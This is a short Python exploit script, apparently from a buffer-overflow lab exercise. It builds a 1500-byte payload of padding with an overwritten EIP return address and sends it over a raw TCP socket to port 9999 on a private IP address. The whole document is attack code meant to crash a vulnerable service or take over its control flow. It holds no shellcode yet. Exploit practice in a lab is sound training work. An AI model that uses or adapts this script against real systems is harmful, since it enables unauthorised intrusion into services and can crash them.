import socket

filler = ("A" * 524).encode('utf-8')
eip = b"\xf3\x12\x17\x31"
offset = ("C" * 472).encode('utf-8')
buffer = ("D" * (1500 - len(filler) - len(eip) - len(offset))).encode('utf-8')

#print(type(filler))
#print(filler)
#print(type(eip))
#print(eip)

input = filler + eip + offset + buffer

#input = input.encode("utf-8")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(("192.168.56.101",9999))
s.connect(("192.168.130.10",9999))
s.send(input)
s.close()
print("done");